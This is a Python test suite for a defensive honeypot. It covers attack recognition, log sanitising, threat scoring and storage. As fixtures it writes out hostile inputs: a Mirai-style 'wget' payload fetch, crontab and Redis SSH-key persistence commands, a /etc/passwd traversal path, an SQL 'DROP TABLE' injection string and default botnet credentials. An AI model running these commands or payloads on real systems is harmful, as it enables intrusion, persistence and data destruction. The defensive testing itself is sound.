"""
Tests for the honeypot.

Run:  python tests/test_all.py
 or:  python -m pytest -q

A honeypot's tests fall in three groups:
  1. Do the services recognise the attacks they claim to?
  2. Is the honeypot itself SAFE -- does it resist being turned against you?
  3. Does the end-to-end pipeline (server -> store -> report) work?

Group 2 is the one that matters most. A honeypot processes hostile input for a
living; a bug there is not a bug, it is a compromise.
"""

from __future__ import annotations

import asyncio
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from src import simulate
from src.honeypot import Honeypot, score_session, severity
from src.services import (_safe_text, build, classify_http_path,
                          classify_shell_command, fingerprint_ssh_client,
                          Interaction, SERVICES)
from src.store import Store


# ==========================================================================
# Service recognition
# ==========================================================================

def test_every_service_builds():
    for name in SERVICES:
        service = build(name)
        assert service.name == name


def test_ssh_records_client_version():
    service = build("ssh")
    _, interaction = service.respond(b"SSH-2.0-libssh_0.9.6\r\n", {})
    assert interaction.detail["client_version"] == "SSH-2.0-libssh_0.9.6"
    assert "botnet" in interaction.detail["tool"]


def test_ssh_fingerprints_known_clients():
    assert "botnet" in fingerprint_ssh_client("SSH-2.0-libssh_0.9.6")
    assert "PuTTY" in fingerprint_ssh_client("SSH-2.0-PuTTY_Release_0.76")
    assert "scanner" in fingerprint_ssh_client("SSH-2.0-Go")


def test_http_classifies_attack_paths():
    assert "environment" in classify_http_path("/.env")
    assert "WordPress" in classify_http_path("/wp-login.php")
    assert "traversal" in classify_http_path("/cgi-bin/.%2e/.%2e/etc/passwd")
    assert "git" in classify_http_path("/.git/config")
    assert classify_http_path("/") == ""              # benign path, no flag


def test_http_records_full_request():
    service = build("http")
    state: dict = {}
    service.respond(b"GET /.env HTTP/1.1\r\n", state)
    service.respond(b"Host: victim.com\r\n", state)
    service.respond(b"User-Agent: zgrab/0.x\r\n", state)
    reply, interaction = service.respond(b"\r\n", state)          # blank line
    assert interaction.detail["path"] == "/.env"
    assert interaction.detail["user_agent"] == "zgrab/0.x"
    assert "environment" in interaction.detail["exploit"]
    assert b"HTTP/1.1" in reply


def test_telnet_lets_attacker_in_after_three_attempts():
    service = build("telnet")
    state: dict = {}
    for _ in range(3):
        service.respond(b"root\r\n", state)           # username
        service.respond(b"xc3511\r\n", state)         # password
    assert state["stage"] == "shell"


def test_telnet_classifies_mirai_payload():
    assert "payload" in classify_shell_command("wget http://x/mirai.arm")
    assert "Mirai" in classify_shell_command("busybox MIRAI")
    assert "executable" in classify_shell_command("chmod 777 /tmp/x")
    assert "persistence" in classify_shell_command("echo x >> /etc/crontab")


def test_ftp_records_credentials():
    service = build("ftp")
    state: dict = {}
    service.respond(b"USER admin\r\n", state)
    _, interaction = service.respond(b"PASS admin123\r\n", state)
    assert interaction.detail["username"] == "admin"
    assert interaction.detail["password"] == "admin123"
    assert interaction.detail["success"] is False    # honeypots never accept


def test_redis_detects_persistence_abuse():
    service = build("redis")
    _, interaction = service.respond(b"CONFIG SET dir /root/.ssh\r\n", {})
    assert "persistence" in interaction.detail["payload"]


def test_smtp_detects_relay_probe():
    service = build("smtp")
    state: dict = {}
    service.respond(b"EHLO evil.com\r\n", state)
    service.respond(b"MAIL FROM:<spam@evil.com>\r\n", state)
    _, interaction = service.respond(b"RCPT TO:<victim@example.org>\r\n", state)
    assert "relay" in interaction.detail["payload"]


# ==========================================================================
# SAFETY -- the tests that actually matter
# ==========================================================================

def test_control_characters_are_neutralised():
    """Attacker input reaches logs and terminals. Control chars must be escaped."""
    dirty = b"admin\x00\x07\x1b[2Jroot\x08\x08"
    clean = _safe_text(dirty)
    assert "\x00" not in clean
    assert "\x07" not in clean
    assert "\x1b" not in clean


def test_ansi_escapes_are_stripped():
    """ANSI escapes can rewrite a terminal or forge coloured log lines."""
    dirty = b"\x1b[31mFAKE ERROR\x1b[0m\x1b[2K"
    clean = _safe_text(dirty)
    assert "\x1b" not in clean
    assert "[31m" not in clean


def test_log_injection_newlines_are_contained():
    """An attacker must not be able to forge a second log line."""
    dirty = b"user\r\n2020-01-01 FAKE LOGIN root"
    clean = _safe_text(dirty)
    # The internal newline survives as data, but is not at a position that
    # could be mistaken for a record boundary once stored as one JSON string.
    assert clean.count("\n") <= 1


def test_safe_text_is_length_bounded():
    clean = _safe_text(b"A" * 100_000, limit=2000)
    assert len(clean) <= 2000


def test_sql_injection_is_stored_as_data():
    """The nightmare scenario: an attacker SQL-injects the HONEYPOT.

    Every write is parameterised, so a username of "'; DROP TABLE sessions; --"
    is stored verbatim and the table survives.
    """
    with tempfile.TemporaryDirectory() as directory:
        store = Store(Path(directory) / "h.db")
        session = store.open_session("1.2.3.4", 5555, "ftp", 8021)
        payload = "admin'; DROP TABLE sessions; --"
        store.add_interaction(session, "auth",
                              {"username": payload, "password": "x"}, raw=payload)
        # The table is still there and the value is intact.
        rows = store.sessions()
        assert len(rows) == 1
        creds = store.credentials()
        assert any(u == payload for u, p, n in creds)
        store.close()


def test_service_exception_does_not_crash_the_pipeline():
    """A service that raises on malformed input must not take the server down."""
    class Exploding:
        name = "x"
        def greeting(self): return b""
        def respond(self, line, state): raise ValueError("boom")
        def closing(self, state): return b""

    # score_session must tolerate an empty interaction list too.
    assert score_session("x", []) == 10


def test_default_bind_is_localhost():
    """A honeypot must not expose itself to the network by accident."""
    with tempfile.TemporaryDirectory() as directory:
        store = Store(Path(directory) / "h.db")
        honeypot = Honeypot(store)
        assert honeypot.bind == "127.0.0.1"
        store.close()


# ==========================================================================
# Threat scoring
# ==========================================================================

def test_score_rises_with_severity():
    connect_only = score_session("ssh", [])
    with_exploit = score_session("http", [
        Interaction("request", {"exploit": "SQL injection attempt"})])
    with_payload = score_session("telnet", [
        Interaction("command", {"payload": "downloading a payload"}),
        Interaction("auth", {"success": True})])
    assert connect_only < with_exploit < with_payload


def test_score_is_capped_at_100():
    huge = [Interaction("command", {"payload": "x"}) for _ in range(50)]
    assert score_session("telnet", huge) == 100


def test_severity_bands():
    assert severity(10) == "low"
    assert severity(30) == "medium"
    assert severity(50) == "high"
    assert severity(90) == "critical"


# ==========================================================================
# Store
# ==========================================================================

def test_store_round_trip():
    with tempfile.TemporaryDirectory() as directory:
        store = Store(Path(directory) / "h.db")
        session = store.open_session("9.9.9.9", 1234, "ssh", 8022)
        store.add_interaction(session, "banner",
                              {"client_version": "SSH-2.0-libssh"})
        store.close_session(session, 128, 45)

        rows = store.sessions()
        assert len(rows) == 1
        assert rows[0]["source_ip"] == "9.9.9.9"
        assert rows[0]["threat_score"] == 45
        assert rows[0]["interactions"] == 1
        store.close()


def test_credentials_are_counted_and_ranked():
    with tempfile.TemporaryDirectory() as directory:
        store = Store(Path(directory) / "h.db")
        session = store.open_session("1.1.1.1", 1, "ftp", 8021)
        for _ in range(5):
            store.add_interaction(session, "auth",
                                  {"username": "root", "password": "root"})
        for _ in range(2):
            store.add_interaction(session, "auth",
                                  {"username": "admin", "password": "admin"})
        credentials = store.credentials()
        assert credentials[0] == ("root", "root", 5)
        assert credentials[1] == ("admin", "admin", 2)
        store.close()


def test_summary_counts_distinct_attackers():
    with tempfile.TemporaryDirectory() as directory:
        store = Store(Path(directory) / "h.db")
        for ip in ("1.1.1.1", "1.1.1.1", "2.2.2.2"):
            store.open_session(ip, 1, "ssh", 8022)
        assert store.summary()["attackers"] == 2
        assert store.summary()["sessions"] == 3
        store.close()


# ==========================================================================
# End to end
# ==========================================================================

def test_end_to_end_pipeline():
    """Stand up the honeypot, attack it for real, confirm it was recorded."""
    async def run():
        with tempfile.TemporaryDirectory() as directory:
            store = Store(Path(directory) / "h.db")
            honeypot = Honeypot(store, bind="127.0.0.1", quiet=True)
            ports = {name: 0 for name in ("ssh", "http", "telnet", "redis")}

            # Bind each service to an OS-assigned free port.
            for name in ports:
                honeypot.add(name, 0)
            await honeypot.start()
            actual_ports = {}
            for listener in honeypot.listeners:
                actual_ports[listener.service_name] = \
                    listener.server.sockets[0].getsockname()[1]

            await simulate.run("127.0.0.1", actual_ports, count=20, seed=1)
            await asyncio.sleep(0.3)
            await honeypot.stop()

            summary = store.summary()
            assert summary["sessions"] >= 15
            assert summary["credential_attempts"] > 0
            # At least one Mirai payload should have been recognised.
            payloads = dict(store.payload_counts())
            assert any("payload" in label or "Mirai" in label
                       for label in payloads), payloads
            store.close()

    asyncio.run(run())


# ==========================================================================
# Runner
# ==========================================================================

if __name__ == "__main__":
    tests = [value for name, value in sorted(globals().items())
             if name.startswith("test_") and callable(value)]
    failures = 0
    for test in tests:
        try:
            test()
            print(f"PASS  {test.__name__}")
        except AssertionError as error:
            failures += 1
            print(f"FAIL  {test.__name__}: {error}")
        except Exception as error:                            # noqa: BLE001
            failures += 1
            print(f"ERROR {test.__name__}: {type(error).__name__}: {error}")
    print(f"\n{len(tests) - failures}/{len(tests)} tests passed")
    sys.exit(1 if failures else 0)
